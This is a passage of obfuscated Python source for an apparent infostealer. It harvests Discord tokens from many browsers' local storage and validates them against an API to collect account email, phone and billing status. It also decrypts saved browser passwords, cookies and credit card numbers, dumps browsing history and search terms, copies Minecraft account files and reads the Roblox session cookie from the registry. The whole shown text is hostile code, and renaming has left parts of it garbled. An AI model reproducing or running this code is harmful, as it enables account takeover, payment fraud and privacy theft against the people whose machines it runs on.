    def lIlIIlllIIlIllII(IIIIIIIllIllIIII, llllIllIllIllIIllI, lllIIIlIlIlIIllI):
        try:
            IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
            llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
            llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
            lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
            lllIIlll = lllIIlll[:-16].decode()
            return lllIIlll
        except Exception:
            return "Failed to decrypt password"
    def IIIllIlIIlll(IIIIIIIllIllIIII, lIllIIllI):
        with open(lIllIIllI, "r", encoding="utf-8") as lIIIIllIlIIIllIIl:
            IlIlIIlllllIlIlI = lIIIIllIlIIIllIIl.read()
        IllIllIlllIllll = json.loads(IlIlIIlllllIlIlI)
        lllIIIlIlIlIIllI = base64.b64decode(IllIllIlllIllll["os_crypt"]["encrypted_key"])
        lllIIIlIlIlIIllI = lllIIIlIlIlIIllI[5:]
        lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI, None, None, None, 0)[1]
        return lllIIIlIlIlIIllI
    def llllIIlIIIl(IIIIIIIllIllIIII):
        llIllllIIllllII = {
            'Discord': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc1': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc2': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc3': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
        for IllIlIIlIIllIlIIlIl, lIllIIllI in llIllllIIllllII.items():
            if not os.lIllIIllI.exists(lIllIIllI):
                continue
            IlIIlIIlIIlIlIlIII = IllIlIIlIIllIlIIlIl.replace(" ", "").lower()
            if "cord" in lIllIIllI:
                if os.lIllIIllI.exists(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + lIIIIllIlIIIllIIl'\\{lIIIlIIIlllIIllIIllIIllllllIlsIlIlIIlllllIlIIlIIlllIII}\\Local State'):
                    for lllIIllllIlI in os.listdir(lIllIIllI):
                        if lllIIllllIlI[-3:] not in ["log", "ldb"]:
                            continue
                        for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lllIIllllIIlIIlllIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
                            for llIIllIIIllIIlIl in re.findall(IIIIIIIllIllIIII.IIllIIIlIlll, IIIIIIllllIIIllll):
                                try:
                                    IIIIIIIIlIIIlIlII = IIIIIIIllIllIIII.lIlIIlllIIlIllII(base64.b64decode(llIIllIIIllIIlIl.split('dQw4w9WgXcQ:')[1]), IIIIIIIllIllIIII.IIIllIlIIlll(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + lIIIIllIlIIIllIIl'\\{lIIIlIIIlllIIllIIllIIllllllIlsIlIlIIlllllIlIIlIIlllIII}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': IIIIIIIIlIIIlIlII})
                                except Exception:
                                    pass
                                if IIlllIIlIlIlI.status_code == 200:
                                    lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
                                    if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
                                        IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
                                        IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
            else:
                for lllIIllllIlI in os.listdir(lIllIIllI):
                    if lllIIllllIlI[-3:] not in ["log", "ldb"]:
                        continue
                    for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lllIIllllIIlIIlllIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
                        for IIIIIIIIlIIIlIlII in re.findall(IIIIIIIllIllIIII.lIlIlIlllIIlIII, IIIIIIllllIIIllll):
                            try:
                                IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': IIIIIIIIlIIIlIlII})
                            except Exception:
                                pass
                            if IIlllIIlIlIlI.status_code == 200:
                                lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
                                if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
                                    IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
                                    IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
        if os.lIllIIllI.exists(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\Mozilla\\Firefox\\Profiles"):
            for lIllIIllI, lIlIIlIllllllIlIIIIl, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\Mozilla\\Firefox\\Profiles"):
                for IlllllIIIllIIlIlI in IIllIIIIlIllIllII:
                    if not IlllllIIIllIIlIlI.endswith('.sqlite'):
                        continue
                    for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lIlIIlIllllllIlIIIIllIIIIllIlIIIllIIllIIllllllIllIIlIlIIIlIlIIIlIIlllIIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
                        for IIIIIIIIlIIIlIlII in re.findall(IIIIIIIllIllIIII.lIlIlIlllIIlIII, IIIIIIllllIIIllll):
                            try:
                                IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': IIIIIIIIlIIIlIlII})
                            except Exception:
                                pass
                            if IIlllIIlIlIlI.status_code == 200:
                                lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
                                if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
                                    IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
                                    IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
    def llIIlllI(IIIIIIIllIllIIII, lIlIIIlIlllll: str or os.PathLike = gettempdir()):
        lllIIllllIlI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for lIlIIlIllllllIlIIIIl in range(random.randint(10, 20)))
        lIllIIllI = os.lIllIIllI.join(lIlIIIlIlllll, lllIIllllIlI)
        open(lIllIIllI, "x")
        return lIllIIllI
    @llIIllllIllIIllIlIll
    def IllIlIIll(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
        lIllIIllI += '\\' + IllIIlllIlI + '\\Login Data'
        if not os.lIllIIllI.isfile(lIllIIllI):
            return
        lIIlIIlllllI = IIIIIIIllIllIIII.llIIlllI()
        copy2(lIllIIllI, lIIlIIlllllI)
        lIIlllIlll = sqlite3.connect(lIIlIIlllllI)
        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                llIlIlIlIIIIIIIIIl, llIlllIIIIlll, IlIIllIlIIIIlllIIII = llIIllIIlIIIIIIl
                IlIIllIlIIIIlllIIII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IlIIllIlIIIIlllIIII, IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI)
                if llIlIlIlIIIIIIIIIl != "":
                    lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"URL: {llIlIlIlIIIIIIIIIl}\nID: {IIIllIlIIIlIlIIIIllIIllIlIIlIIllIlIIlIl}\nPASSW0RD: {pllIlIlIIIIIIllIlIIlsswoIIlllIIlIlIIlIIlllIIIlIIIlIIIlllIIllIIl}\n\n")
        llIIlIlllIIIlIllIl.close()
        lIIlllIlll.close()
        os.remove(lIIlIIlllllI)
    @llIIllllIllIIllIlIll
    def IIIlIlllIl(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
        lIllIIllI += '\\' + IllIIlllIlI + '\\Network\\Cookies'
        if not os.lIllIIllI.isfile(lIllIIllI):
            return
        lIlIIlllIIIllIIl = IIIIIIIllIllIIII.llIIlllI()
        copy2(lIllIIllI, lIlIIlllIIIllIIl)
        lIIlllIlll = sqlite3.connect(lIlIIlllIIIllIIl)
        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                lIlllIIlIll, IllIlIIlIIllIlIIlIl, lIllIIllI, IlllIIlIlllI, IIIIllIII = llIIllIIlIIIIIIl
                lllIllIlII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IlllIIlIlllI, IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI)
                if lIlllIIlIll and IllIlIIlIIllIlIIlIl and lllIllIlII != "":
                    lIIIIllIlIIIllIIl.write("{}\t{}\t{}\t{}\t{}\t{}\IIIIIIIlIlIIlllII{}\n".format(
                        lIlllIIlIll, 'FALSE' if IIIIllIII == 0 else 'TRUE', lIllIIllI, 'FALSE' if lIlllIIlIll.startswith('.') else 'TRUE', IIIIllIII, IllIlIIlIIllIlIIlIl, lllIllIlII))
        llIIlIlllIIIlIllIl.close()
        lIIlllIlll.close()
        os.remove(lIlIIlllIIIllIIl)
    @llIIllllIllIIllIlIll
    def lIllllIIIllIIlIII(IIIIIIIllIllIIII):
        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'Login Data')
                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
                llIIlIlllIIIlIllIl.execute("SELECT action_url, username_value, password_value FROM logins")
                for IIlllIIlIlIlI in llIIlIlllIIIlIllIl.fetchall():
                    llIlIlIlIIIIIIIIIl = IIlllIIlIlIlI[0]
                    llIlllIIIIlll = IIlllIIlIlIlI[1]
                    llIlIIIllIllIIlIlIlI = IIlllIIlIlIlI[2]
                    IllIIIlllIII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(llIlIIIllIllIIlIlIlI, IIIIIIIllIllIIII.IIllllIllIIIlI)
                    if llIlIlIlIIIIIIIIIl != "":
                        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"URL: {llIlIlIlIIIIIIIIIl}\nID: {IIIllIlIIIlIlIIIIllIIllIlIIlIIllIlIIlIl}\nPASSW0RD: {deIlIlIIlllllIlIlIrllIIllIIIllIIlIlpIIIIIIIllIIlIlIIIlIlIIlIIdlIlIIlIllllllIlIIIIlpllIlIlIIIIIIllIlIIlsswoIIlllIIlIlIIlIIlllIIIlIIIlIIIlllIIllIIl}\n\n")
                llIIlIlllIIIlIllIl.close()
                lIIlllIlll.close()
                os.remove(IlllIIIlIIIll)
        lIIIIllIlIIIllIIl.close()
    @llIIllllIllIIllIlIll
    def lIIllIlIIlllIII(IIIIIIIllIllIIII):
        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'Network', 'cookies')
                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
                llIIlIlllIIIlIllIl.execute("SELECT host_key, name, encrypted_value from cookies")
                for IIlllIIlIlIlI in llIIlIlllIIIlIllIl.fetchall():
                    lIIIlllIIIIlIIIl = IIlllIIlIlIlI[0]
                    IIIllIlIIIlIlIIIIllI = IIlllIIlIlIlI[1]
                    IIlIIlIlIlIllII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IIlllIIlIlIlI[2], IIIIIIIllIllIIII.IIllllIllIIIlI)
                    if lIIIlllIIIIlIIIl != "":
                        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{lIIIlllIIIIlIIIl}	TRUE"+"		"+ f"/FALSE	2597573456	{IIIllIlIIIlIlIIIIllI}	{IIlIIlIlIlIllII}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in IIlIIlIlIlIllII:
                        IIIIIIIllIllIIII.llIlllllIIIl.append(IIlIIlIlIlIllII)
                llIIlIlllIIIlIllIl.close()
                lIIlllIlll.close()
                os.remove(IlllIIIlIIIll)
        lIIIIllIlIIIllIIl.close()
    def llIlllIIllllIlIIIII(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
        lIllIIllI += '\\' + IllIIlllIlI + '\\History'
        if not os.lIllIIllI.isfile(lIllIIllI):
            return
        lIIllIllIIlIIlII = IIIIIIIllIllIIII.llIIlllI()
        copy2(lIllIIllI, lIIllIllIIlIIlII)
        lIIlllIlll = sqlite3.connect(lIIllIllIIlIIlII)
        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All History.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
            lIllIlllIllIII = []
            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                llIlIlIlIIIIIIIIIl, IIlIIIIII, IlIllllllIIlI, IIIlIIlllllIlIllllI = llIIllIIlIIIIIIl
                if llIlIlIlIIIIIIIIIl and IIlIIIIII and IlIllllllIIlI and IIIlIIlllllIlIllllI != "":
                    lIllIlllIllIII.append((llIlIlIlIIIIIIIIIl, IIlIIIIII, IlIllllllIIlI, IIIlIIlllllIlIllllI))
            lIllIlllIllIII.sort(key=lambda llIllIlIllIllllll: llIllIlIllIllllll[3], reverse=True)
            for IlllIIIIlIII in lIllIlllIllIII:
                lIIIIllIlIIIllIIl.write("Visit Count: {:<6} TlIIllllllIlIIIIIIIlllIIlIlIIIlIlIIIlIIlllIIII: {:<40}\n".format(IlllIIIIlIII[2], IlllIIIIlIII[1]))
        llIIlIlllIIIlIllIl.close()
        lIIlllIlll.close()
        os.remove(lIIllIllIIlIIlII)
    def IlIlIllll(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
        lIllIIllI += '\\' + IllIIlllIlI + '\\Web Data'
        if not os.lIllIIllI.isfile(lIllIIllI):
            return
        llllIIllIIlllIlIIllI = IIIIIIIllIllIIII.llIIlllI()
        copy2(lIllIIllI, llllIIllIIlllIlIIllI)
        lIIlllIlll = sqlite3.connect(llllIIllIIlllIlIIllI)
        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                IlllIIIlIllI, IlllIIIIIIIIlII, IllllIIlIlI, lIlIIlIlIllllll = llIIllIIlIIIIIIl
                if IlllIIIlIllI and lIlIIlIlIllllll != "":
                    lIIIIllIlIIIllIIl.write(
                        lIIIIllIlIIIllIIl"Name: {IllIlIIlIIllIlIIlIl_on_card}   Expiration Month: {IlllIIIIIIIIlII}   Expiration Year: {ellIllIlIllIllllllpiIIIlllllllIIllIIllIItlIIllllllIlon_year}   Card Number: {IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(card_numllIlIIIllllerlIlIIlIllllllIlIIIIlenIlIlIIlllllIlIlIryptelIIIlIIIlllIIllIIl, sellIIIIllIlIIIllIIl.mllIlIlIIIIIIllIlIIlsIIIIIIIlleIIlllIIlIlIlIkIIlIlIIIlIlIIlIIllIIllIIIllIIlIIlIIlllII)}\n")
        lIIIIllIlIIIllIIl.close()
        llIIlIlllIIIlIllIl.close()
        lIIlllIlll.close()
        os.remove(llllIIllIIlllIlIIllI)
    @llIIllllIllIIllIlIll
    def IIlIIlIII(IIIIIIIllIllIIII):
        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
        def IllllIIIlI(lIlIIIIIllI):
            llIllIIllIII = ""
            lIlIIIIIllI.execute('SELECT title, url, last_visit_time FROM urls')
            for IIIlIlIIlIllIIIIIlll in lIlIIIIIllI.fetchall():
                llIllIIllIII += lIIIIllIlIIIllIIl"Search Title: {IIIlIlIIlIllIIIIIlll[0]}\nURL: {lIIllllllIlIIIIIIIllIIlIlIIIlIlIIIlIIlllIIIIm[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%lIIIlIIIlllIIllIIl - %H:%M:%S')}\n\n"
            return llIllIIllIII
        def llIIlIIllI(lIlIIIIIllI):
            lIlIIIIIllI.execute('SELECT term FROM keyword_search_terms')
            lllIllIIIlllllI = ""
            for IIIlIlIIlIllIIIIIlll in lIlIIIIIllI.fetchall():
                if IIIlIlIIlIllIIIIIlll[0] != "":
                    lllIllIIIlllllI += lIIIIllIlIIIllIIl"{lIIllllllIlIIIIIIIllIIlIlIIIlIlIIIlIIlllIIIIm[0]}\n"
            return lllIllIIIlllllI
        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'History')
                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
                IIlIlIIllIIlIlllI = llIIlIIllI(llIIlIlllIIIlIllIl)
                IlIIlIIllIl = IllllIIIlI(llIIlIlllIIIlIllIl)
                lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{' '*17}SEARCH\n{'-'*50}\n{IIlIlIIllIIlIllIlIIlllIII}\n{' '*17}\n\nLinks History\n{'-'*50}\n{wIIlIlIIIlIlIIlIIllIlIIIlllllIlIIlIllllllIlIIIIlhlIIllllllIlsIIIIIIIlloIIlllIIlIlIlIllIIllIIIllIIlIIlIIlllII}")
                llIIlIlllIIIlIllIl.close()
                lIIlllIlll.close()
                os.remove(IlllIIIlIIIll)
        lIIIIllIlIIIllIIl.close()
    def llIIlIlI(IIIIIIIllIllIIII):
        lIIIIllIlIIIllIIl = open(IIIIIIIllIllIIII.llIIIIllIIl + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
        for IIIIIIIIlIIIlIlII in IIIIIIIllIllIIII.IlIlIlIlll:
            lIlIllllll = httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll, IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).json()
            IIIllIlIIIlIlIIIIllI = lIlIllllll.get('username') + '#' + str(lIlIllllll.get("discriminator"))
            lIlllIlI = ""
            IlIlIllIlIIlIIIIIlI = lIlIllllll['flags']
            if (IlIlIllIlIIlIIIIIlI == 1):
                lIlllIlI += "Staff, "
            if (IlIlIllIlIIlIIIIIlI == 2):
                lIlllIlI += "Partner, "
            if (IlIlIllIlIIlIIIIIlI == 4):
                lIlllIlI += "Hypesquad Event, "
            if (IlIlIllIlIIlIIIIIlI == 8):
                lIlllIlI += "Green Bughunter, "
            if (IlIlIllIlIIlIIIIIlI == 64):
                lIlllIlI += "Hypesquad Bravery, "
            if (IlIlIllIlIIlIIIIIlI == 128):
                lIlllIlI += "HypeSquad Brillance, "
            if (IlIlIllIlIIlIIIIIlI == 256):
                lIlllIlI += "HypeSquad Balance, "
            if (IlIlIllIlIIlIIIIIlI == 512):
                lIlllIlI += "Early Supporter, "
            if (IlIlIllIlIIlIIIIIlI == 16384):
                lIlllIlI += "Gold BugHunter, "
            if (IlIlIllIlIIlIIIIIlI == 131072):
                lIlllIlI += "Verified Bot Developer, "
            if (IlIlIllIlIIlIIIIIlI == 4194304):
                lIlllIlI += "Active Developer, "
            if (lIlllIlI == ""):
                lIlllIlI = "None"
            IlllIlIIIllIllI = lIlIllllll.get("email")
            IIllIllllIlIIII = lIlIllllll.get("phone") if lIlIllllll.get("phone") else "No Phone Number attached"
            IlllIIIIllIIlII = httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll + '/billing/subscriptions', IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).json()
            llIIlllIllIlIllllIl = False
            llIIlllIllIlIllllIl = bool(len(IlllIIIIllIIlII) > 0)
            lIIIIlIIlIIII = bool(len(json.loads(httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll + "/billing/payment-sources", IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).text)) > 0)
            lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{' '*17}{IIIllIlIIIlIlIIIIlIlIIlllIII}\n{'-'*50}\nBilling?: {llIlIIIllllilling}\nNitIIlllIIlIlIlIo: {llIIlllIllIlIllllIl}\nBalIIIlIIIlllIIllIIlges: {lIlllIlI}\nPhone: {IIllIllllIlIIII}\nToken: {IIIIIIIlloken}\nEmail: {IIlIlIIIlIlIIlIImllIlIlIIIIIIllIlIIllIIllllllIlIlIIlllII}\n\n")
        lIIIIllIlIIIllIIl.close()
    def llIllIllIlII(IIIIIIIllIllIIII):
        IIIllIIlIllIIIIlll = ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Minecraft')
        os.makedirs(IIIllIIlIllIIIIlll, exist_ok=True)
        lIIlllII = ntpath.join(IIIIIIIllIllIIII.IIIllIIllIlllIlllII, '.minecraft')
        lIIllIlIlllIIIl = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
        for IlllllIIIllIIlIlI in lIIllIlIlllIIIl:
            if ntpath.exists(ntpath.join(lIIlllII, IlllllIIIllIIlIlI)):
                shutil.copy2(ntpath.join(lIIlllII, IlllllIIIllIIlIlI), IIIllIIlIllIIIIlll + IIIIIIIllIllIIII.lIIIllIllllII + IlllllIIIllIIlIlI)
    def lIllIIlIIIllIIIll(IIIIIIIllIllIIII):
        def IIIllllII(lIllIIllI):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIh}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        IlIlIIlIlIIIlI = IIIllllII(IIlllIIlIlIlI'HKLM')
        if not IlIlIIlIlIIIlI:
